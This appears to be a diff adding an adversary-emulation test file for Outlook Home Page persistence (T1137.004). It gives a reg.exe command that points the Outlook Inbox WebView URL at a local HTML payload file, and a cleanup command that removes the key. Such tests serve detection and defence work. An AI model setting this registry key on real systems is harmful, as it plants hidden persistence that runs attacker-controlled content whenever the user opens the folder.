@@ -1,0 +1,12 @@
+#TechniqueName: Office Application Startup: Outlook Home Page
+#AtomicTestName: Install Outlook Home Page Persistence
+#Description: This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.&&Triggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).&
+#Language: cmd
+
+#commands
+reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://PathToAtomicsFolder\T1137.004\src\T1137.004.html /f
+
+
+#cleanup_commands
+reg.exe delete HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /f
+
